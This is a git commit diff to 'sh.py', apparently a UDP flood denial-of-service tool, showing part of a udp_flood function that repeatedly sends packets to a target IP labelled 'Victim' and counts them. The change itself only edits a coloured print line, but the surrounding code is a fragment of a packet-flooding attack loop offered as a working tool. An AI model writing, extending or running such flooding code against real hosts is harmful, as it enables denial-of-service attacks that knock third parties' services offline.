942015f721f6169ebf0e938abbe6d4844393159e
kitunyacell-kun <kitunyacell@gmail.com>
2026-01-22 00:09:34 +0700

    Update sh.py

--- sh.py
+++ sh.py
@@ -83,7 +83,7 @@ def udp_flood(ip, port, message, duration):
             s.sendto(message, target)
             packet_count += 1
             print(f"\033[48;5;7m\033[38;5;0m {packet_count}  \033[0m \033[38;5;6mVictim port address? \033[38;5;5m" +str(ip)+ " \033[91mSent packet")
-            print(f"\033[32m[][][][]  \033[33mVictim port address \033[37m" +str(ip)+ " \033[38;5;206mSent packet")
+            print(f"\033[32m[][][][]  \033[33mVictim port address¿ \033[4m" +str(ip)+ "\033[0m \033[38;5;206mSent packet")
         except socket.error:
             # Jika soket tidak dapat mengirim paket, hentikan loop
             break
